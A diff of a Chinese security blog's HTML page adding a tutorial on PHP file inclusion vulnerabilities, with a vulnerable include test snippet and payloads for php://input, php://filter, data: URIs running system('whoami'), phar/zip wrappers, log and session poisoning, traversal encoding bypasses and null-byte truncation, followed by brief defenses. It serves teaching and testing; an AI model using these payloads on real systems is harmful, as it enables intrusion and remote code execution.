@@ -285,6 +285,408 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/php文件包含漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VegyChick">
+      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜鸟博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/10/17/php文件包含漏洞/" class="post-title-link" itemprop="url">php文件包含漏洞</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-17 12:10:35 / 修改时间：12:10:55" itemprop="dateCreated datePublished" datetime="2019-10-17T12:10:35+08:00">2019-10-17</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
+<ol>
+<li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="noopener">include()</a></li>
+<li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="noopener">include_once()</a></li>
+<li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="noopener">require()</a></li>
+<li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="noopener">require_once()</a></li>
+</ol>
+<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" alt="img"></a></p>
+<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" alt="img"></a></p>
+<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>即可成功解析phpinfo。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" alt="img"></a></p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ol>
+<li>具有相关的文件包含函数。</li>
+<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
+<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
+</ol>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>两个配置选项均需要为On，才能远程包含文件成功。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" alt="img"></a></p>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
+<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off</p>
+<p>若有特殊要求，会在利用条件里指出。</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p>姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" alt="img"></a></p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：无甚</p>
+<p>姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg==&quot;)b&quot;&lt;?php \r\n\t$file = $_GET[&apos;file&apos;];\r\n\tinclude $file;\r\n?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其他姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：</p>
+<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" alt="img"></a></p>
+<p>指定绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者使用相对路径（这里test.zip就在当前目录下）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" alt="img"></a></p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：<br>构造zip包的方法同phar。</p>
+<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" alt="img"></a></p>
+<p>若是使用相对路径，则会包含失败。</p>
+<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>姿势一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" alt="img"></a></p>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>姿势二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" alt="img"></a></p>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>姿势：</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt="img"></a></p>
+<p>常见的php-session存放位置：</p>
+<ol>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+</ol>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" alt="img"></a></p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/透過-lfi-引入-php-session-檔案觸發-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
+<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>姿势：</p>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" alt="img"></a></p>
+<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" alt="img"></a></p>
+<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
+<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
+<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：</p>
+<p>用ssh连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</span><br></pre></td></tr></table></figure>
+
+<p>之后会提示输入密码等等，随便输入。</p>
+<p>然后在remotehost的ssh-log中即可写入php代码：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" alt="img"></a></p>
+<p>之后进行文件包含即可。</p>
+<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">RCE with LFI and SSH Log Poisoning</a></p>
+<h2 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h2><p>利用条件：</p>
+<ol>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>姿势：</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p>可以参考这个：</p>
+<ol>
+<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">The proc/self/environ Injection</a></li>
+<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></li>
+</ol>
+<h2 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h2><p>跟包含environ类似。</p>
+<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="noopener">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
+<h2 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h2><p><a href="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" target="_blank" rel="noopener"><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt="img"></a></p>
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a href="https://www.insomniasec.com/downloads/publications/LFI" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
+<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN夏令营-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a></p>
+<h2 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h2><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
+<p>姿势：</p>
+<p>往往要配合上传的姿势，不说了，太多了。</p>
+<h2 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h2><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</p>
+<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include &apos;/var/www/html/&apos;.$file.&apos;/test/test.php&apos;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样就很“难”直接去包含前面提到的种种文件。</p>
+<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include &apos;/var/www/html/&apos;.$file;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
+<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=../../log/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" alt="img"></a></p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li>利用url编码<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>容器/服务器的编码方式<ul>
+<li>../<ul>
+<li>..%c0%af<ul>
+<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
+</ul>
+</li>
+<li>%c0%ae%c0%ae/<ul>
+<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
+<li>Apache Tomcat Directory Traversal</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file.&apos;/test/test.php&apos;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>url格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>
+
+<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
+<p>姿势一：query（？）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure>
+
+<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" alt="img"></a></p>
+<p>姿势二：fragment（#）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure>
+
+<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。
+<a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" alt="img"></a></p>
+<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file.&apos;/test/test.php&apos;;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造压缩包如下：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" alt="img"></a></p>
+<p>其中test.php内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用zip协议，注意要指定绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure>
+
+<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" alt="img"></a></p>
+<p>能成功包含。</p>
+<p>在利用phar协议的时候有些问题。哪位能指教一下？<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" alt="img"></a></p>
+<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件： php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=././././。。。省略。。。././shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件： php版本 &lt; php 5.3.4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt%00</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" alt="img"></a></p>
+<p>能利用00截断的场景现在应该很少了：）</p>
+<h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol>
+<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
+<li>做好文件的权限管理</li>
+<li>对危险字符进行过滤等等</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/sql注入骚操作/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2083,408 +2485,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/xxe学习/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="VegyChick">
-      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="菜鸟博客">
-    </span>
-
-    
-      <header class="post-header">
-
